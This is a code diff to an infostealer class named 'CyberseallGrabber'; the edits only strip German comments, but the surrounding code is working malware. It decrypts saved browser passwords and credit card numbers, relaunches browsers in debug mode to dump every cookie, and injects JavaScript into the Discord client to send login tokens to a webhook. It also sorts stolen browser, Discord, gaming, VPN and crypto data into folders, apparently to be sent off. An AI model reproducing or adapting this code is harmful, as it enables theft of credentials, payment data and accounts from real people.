@@ -833,7 +833,6 @@ class CyberseallGrabber:
                                             
                                             for test_key in [aes_key, chacha20_key]:
                                                 try:
-                                                    # Vereinfachte App-Bound Entschlüsselung
                                                     decoded_key = base64.b64decode(app_bound_encrypted_key)
                                                     if len(decoded_key) > 60:
                                                         flag = decoded_key[0] if len(decoded_key) > 0 else 0
@@ -861,7 +860,6 @@ class CyberseallGrabber:
                                 master_key = base64.b64decode(encrypted_key)[5:]
                                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                                 
-                                # Verwende App-Bound Key falls verfügbar, sonst Master Key
                                 if app_bound_key:
                                     master_key = app_bound_key
                                     
@@ -907,13 +905,11 @@ class CyberseallGrabber:
                                             pass
                                     
 
-                                    # Nur vollständig entschlüsselte und saubere Passwörter hinzufügen
                                     if (decrypted_password and 
                                         decrypted_password != "Failed to decrypt" and
                                         not decrypted_password.startswith("Partial:") and
                                         len(decrypted_password) >= 3):
                                         
-                                        # Prüfe auf korrupte Zeichen
                                         clean_password = ''.join(c for c in decrypted_password if 32 <= ord(c) <= 126)
                                         if len(clean_password) >= 3 and len(clean_password) == len(decrypted_password):
                                             passwords.append({
@@ -1053,7 +1049,6 @@ class CyberseallGrabber:
 
             pw_data = []
             for pwd in all_data:
-                # Nur vollständig entschlüsselte Passwörter verarbeiten
                 password = pwd.get('password', '')
                 if (password and 
                     password != "Failed to decrypt" and 
@@ -1214,7 +1209,6 @@ class CyberseallGrabber:
 
             browsers = {}
             
-            # Chrome Varianten (erweitert)
             chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
             if os.path.exists(chrome_base):
                 for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
@@ -1222,7 +1216,6 @@ class CyberseallGrabber:
                     if os.path.exists(profile_path):
                         browsers[f'Chrome-{profile}'] = profile_path
                 
-                # Automatische Erkennung aller Chrome-Profile
                 try:
                     for item in os.listdir(chrome_base):
                         item_path = os.path.join(chrome_base, item)
@@ -1233,7 +1226,6 @@ class CyberseallGrabber:
                 except:
                     pass
             
-            # Edge Varianten (erweitert)
             edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
             if os.path.exists(edge_base):
                 for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
@@ -1241,7 +1233,6 @@ class CyberseallGrabber:
                     if os.path.exists(profile_path):
                         browsers[f'Edge-{profile}'] = profile_path
                 
-                # Automatische Erkennung aller Edge-Profile
                 try:
                     for item in os.listdir(edge_base):
                         item_path = os.path.join(edge_base, item)
@@ -1252,7 +1243,6 @@ class CyberseallGrabber:
                 except:
                     pass
             
-            # Brave (erweitert)
             brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
             if os.path.exists(brave_base):
                 for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
@@ -1260,7 +1250,6 @@ class CyberseallGrabber:
                     if os.path.exists(profile_path):
                         browsers[f'Brave-{profile}'] = profile_path
                 
-                # Automatische Erkennung aller Brave-Profile
                 try:
                     for item in os.listdir(brave_base):
                         item_path = os.path.join(brave_base, item)
@@ -1271,7 +1260,6 @@ class CyberseallGrabber:
                 except:
                     pass
             
-            # Opera
             opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
             if os.path.exists(opera_path):
                 browsers['Opera'] = opera_path
@@ -1279,7 +1267,6 @@ class CyberseallGrabber:
             for browser_name, webdata_path in browsers.items():
                 if os.path.exists(webdata_path):
                     try:
-                        # Hole den Verschlüsselungsschlüssel
                         browser_base = os.path.dirname(os.path.dirname(webdata_path))
                         local_state_path = os.path.join(browser_base, "Local State")
                         
@@ -1337,10 +1324,8 @@ class CyberseallGrabber:
                                     card_number = "[ENCRYPTED]"
                                     if master_key and card[4]:
                                         try:
-                                            # ULTIMATE KREDITKARTEN-ENTSCHLÜSSELUNG
                                             decrypted_number = None
                                             
-                                            # METHODE 1: Standard AES-GCM
                                             try:
                                                 if card[4][:3] == b'v10' or card[4][:3] == b'v11':
                                                     iv = card[4][3:15]
@@ -1350,7 +1335,6 @@ class CyberseallGrabber:
                                             except:
                                                 pass
                                             
-                                            # METHODE 2: DPAPI Entschlüsselung
                                             if not decrypted_number:
                                                 try:
                                                     result = win32crypt.CryptUnprotectData(card[4], None, None, None, 0)
@@ -1359,7 +1343,6 @@ class CyberseallGrabber:
                                                 except:
                                                     pass
                                             
-                                            # METHODE 3: Verschiedene IV-Positionen
                                             if not decrypted_number:
                                                 try:
                                                     for iv_start in [0, 3, 12]:
@@ -1376,19 +1359,15 @@ class CyberseallGrabber:
                                                 except:
                                                     pass
                                             
-                                            # METHODE 4: Partial Recovery für Kreditkarten
                                             if not decrypted_number:
                                                 try:
                                                     if isinstance(card[4], bytes) and len(card[4]) > 10:
-                                                        # Suche nach Kreditkartennummern-Mustern
                                                         for start in range(0, min(len(card[4]), 20)):
                                                             for end in range(start + 12, len(card[4]) + 1):
                                                                 chunk = card[4][start:end]
-                                                                # Extrahiere nur Zahlen
                                                                 numbers = ''.join(chr(c) for c in chunk if 48 <= c <= 57)
                                                                 if len(numbers) >= 12 and len(numbers) <= 19:
-                                                                    # Prüfe ob es eine gültige Kreditkartennummer sein könnte
-                                                                    if numbers.startswith(('4', '5', '3', '6')):  # Visa, MC, Amex, Discover
+                                                                    if numbers.startswith(('4', '5', '3', '6')):
                                                                         decrypted_number = numbers
                                                                         break
                                                             if decrypted_number:
@@ -1397,7 +1376,6 @@ class CyberseallGrabber:
                                                     pass
                                             
                                             if decrypted_number and len(decrypted_number) >= 12:
-                                                # Maskiere die Nummer (zeige nur letzte 4 Ziffern)
                                                 card_number = f"****-****-****-{decrypted_number[-4:]}"
                                         except:
                                             pass
@@ -1461,7 +1439,6 @@ class CyberseallGrabber:
         try:
             cookies_data = []
             
-            # Browser-Konfiguration für Remote Debugging
             DEBUG_PORT = 9222
             LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
             APP_DATA = os.getenv('APPDATA')
@@ -1519,7 +1496,7 @@ class CyberseallGrabber:
                 """WebSocket Debug URL abrufen"""
                 try:
                     import time
-                    time.sleep(2)  # Warte bis Browser gestartet ist
+                    time.sleep(2)
                     response = requests.get(f'http://localhost:{DEBUG_PORT}/json', timeout=5)
                     data = response.json()
                     return data[0]['webSocketDebuggerUrl'].strip()
@@ -1540,40 +1517,32 @@ class CyberseallGrabber:
                 except:
                     return []
             
-            # Extrahiere Cookies von allen Browsern
             for browser_name, config in browsers_config.items():
                 if not os.path.exists(config['bin']):
                     continue
                 
-                # Für jeden Browser alle Profile durchgehen
                 for profile in config['profiles']:
                     profile_path = os.path.join(config['user_data'], profile)
                     if not os.path.exists(profile_path):
                         continue
                     
                     try:
-                        # Browser schließen falls läuft
                         close_browser(config['bin'])
                         
-                        # Browser mit Debug-Modus starten
                         browser_process = start_browser_debug(config['bin'], config['user_data'], profile)
                         if not browser_process:
                             continue
                         
-                        # WebSocket URL abrufen
                         ws_url = get_debug_ws_url()
                         if not ws_url:
                             browser_process.terminate()
                             continue
                         
-                        # Cookies über Debug Protocol abrufen
                         debug_cookies = get_all_cookies_debug(ws_url)
                         
-                        # Browser beenden
                         browser_process.terminate()
                         close_browser(config['bin'])
                         
-                        # Cookies verarbeiten
                         for cookie in debug_cookies:
                             try:
                                 cookie_info = {
@@ -1592,7 +1561,6 @@ class CyberseallGrabber:
                             except:
                                 continue
                         
-                        # Kurze Pause zwischen Profilen
                         import time
                         time.sleep(1)
                         
@@ -1607,19 +1575,15 @@ class CyberseallGrabber:
             
             self.co = cookies_data
             
-            # Cookies in Dateien speichern
             if cookies_data:
                 try:
-                    # JSON Format für strukturierte Daten
                     with open(os.path.join(self.d, "cookies.json"), "w", encoding="utf-8") as f:
                         json.dump(cookies_data, f, indent=2, ensure_ascii=False)
                     
-                    # TXT Format für einfache Lesbarkeit
                     with open(os.path.join(self.d, "cookies.txt"), "w", encoding="utf-8") as f:
                         f.write("BROWSER COOKIES EXTRACTOR (Remote Debug Protocol)\n")
                         f.write("=" * 60 + "\n\n")
                         
-                        # Gruppiere nach Browser
                         browsers_found = {}
                         for cookie in cookies_data:
                             browser = cookie['browser']
@@ -1631,7 +1595,7 @@ class CyberseallGrabber:
                             f.write(f"{browser.upper()} ({len(browser_cookies)} cookies)\n")
                             f.write("-" * 50 + "\n")
                             
-                            for cookie in browser_cookies[:25]:  # Zeige 25 pro Browser
+                            for cookie in browser_cookies[:25]:
                                 f.write(f"Host: {cookie['host']}\n")
                                 f.write(f"Name: {cookie['name']}\n")
                                 f.write(f"Value: {cookie['value']}\n")
@@ -2103,10 +2067,8 @@ const sendTokenToWebhook = (token) => {{
     }} catch (e) {{}}
 }};
 
-// Monitor Token alle 30 Sekunden
 setInterval(extractToken, 30000);
 
-// Original Discord Code
 module.exports = require('./core.asar');
 '''
                                         
@@ -2258,34 +2220,27 @@ module.exports = require('./core.asar');
             except:
                 pass
             
-            # Erstelle organisierte Ordnerstruktur
             try:
-                # Browser Data Ordner
                 browser_dir = os.path.join(self.d, "01_Browser_Data")
                 if not os.path.exists(browser_dir):
                     os.makedirs(browser_dir)
                 
-                # Discord Data Ordner
                 discord_dir = os.path.join(self.d, "02_Discord_Data")
                 if not os.path.exists(discord_dir):
                     os.makedirs(discord_dir)
                 
-                # Gaming Data Ordner
                 gaming_dir = os.path.join(self.d, "03_Gaming_Data")
                 if not os.path.exists(gaming_dir):
                     os.makedirs(gaming_dir)
                 
-                # VPN Data Ordner
                 vpn_dir = os.path.join(self.d, "04_VPN_Data")
                 if not os.path.exists(vpn_dir):
                     os.makedirs(vpn_dir)
                 
-                # Files Data Ordner
                 files_dir = os.path.join(self.d, "05_Files_Data")
                 if not os.path.exists(files_dir):
                     os.makedirs(files_dir)
                 
-                # Verschiebe Browser-Dateien
                 browser_files = ["passwords.txt", "browser_history.txt", "autofill_data.txt", "cookies.txt", "cookies.json", "browser_summary.txt"]
                 for file in browser_files:
                     src = os.path.join(self.d, file)
@@ -2293,7 +2248,6 @@ module.exports = require('./core.asar');
                         dst = os.path.join(browser_dir, file)
                         shutil.move(src, dst)
                 
-                # Verschiebe Discord-Dateien
                 discord_files = ["valid_tokens.json", "discord_injection.txt", "token_summary.txt"]
                 for file in discord_files:
                     src = os.path.join(self.d, file)
@@ -2301,7 +2255,6 @@ module.exports = require('./core.asar');
                         dst = os.path.join(discord_dir, file)
                         shutil.move(src, dst)
                 
-                # Verschiebe Gaming-Dateien
                 gaming_files = ["gaming_summary.txt"]
                 for file in gaming_files:
                     src = os.path.join(self.d, file)
@@ -2309,7 +2262,6 @@ module.exports = require('./core.asar');
                         dst = os.path.join(gaming_dir, file)
                         shutil.move(src, dst)
                 
-                # Verschiebe VPN-Dateien
                 vpn_files = ["vpn_summary.txt"]
                 for file in vpn_files:
                     src = os.path.join(self.d, file)
@@ -2317,7 +2269,6 @@ module.exports = require('./core.asar');
                         dst = os.path.join(vpn_dir, file)
                         shutil.move(src, dst)
                 
-                # Verschiebe andere Dateien
                 other_files = ["files.txt", "system_info.json", "GRABBER_STATISTICS.txt"]
                 for file in other_files:
                     src = os.path.join(self.d, file)
@@ -2325,21 +2276,18 @@ module.exports = require('./core.asar');
                         dst = os.path.join(files_dir, file)
                         shutil.move(src, dst)
                 
-                # Verschiebe Game-Ordner
                 for item in os.listdir(self.d):
                     item_path = os.path.join(self.d, item)
                     if os.path.isdir(item_path) and item.startswith("game_"):
                         dst = os.path.join(gaming_dir, item)
                         shutil.move(item_path, dst)
                 
-                # Verschiebe VPN-Ordner
                 for item in os.listdir(self.d):
                     item_path = os.path.join(self.d, item)
                     if os.path.isdir(item_path) and item.startswith("vpn_"):
                         dst = os.path.join(vpn_dir, item)
                         shutil.move(item_path, dst)
                 
-                # Verschiebe File-Dateien
                 for item in os.listdir(self.d):
                     item_path = os.path.join(self.d, item)
                     if os.path.isfile(item_path) and (item.startswith("file_") or item.startswith("crypto_")):
